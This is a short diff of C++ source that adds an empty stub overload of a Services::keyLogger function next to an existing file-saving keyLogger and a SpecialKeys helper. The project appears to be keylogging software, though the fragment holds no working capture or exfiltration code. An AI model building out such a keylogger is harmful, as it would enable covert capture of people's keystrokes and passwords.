@@ -41,6 +41,10 @@ bool Services::keyLogger(const std::string &saveFile) {
     return true;  
 }
 
+std::vector<std::string> Services::keyLogger(Command command) {
+    return std::vector<std::string> ();
+}
+
 bool SpecialKeys(int S_Key) {
     switch (S_Key)
     {
